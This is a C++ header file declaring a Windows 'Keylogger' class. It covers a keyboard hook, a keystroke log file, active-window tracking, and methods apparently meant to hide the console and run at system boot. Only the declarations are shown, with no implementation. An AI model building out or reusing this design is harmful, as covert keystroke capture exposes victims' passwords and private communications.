#pragma once
#include <windows.h>
#include <string>
#include <fstream>
#include <set>

class Keylogger {
private:
    HHOOK hookHandle;
    std::ofstream logFile;
    char lastWindow[256]{};
    std::set<int> pressedKeys; // Track currently pressed keys
public:
    Keylogger(const std::string& filename);
    ~Keylogger();
    void InstallHook();
    void RemoveHook();
    void Run();
    void LogKeystroke(int vkCode, bool isKeyDown);
    void LogKey(int vkCode);
    static LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
    static void SetConsoleVisibility();
    static bool IsSystemBooting();
    static Keylogger& GetInstance();
}; 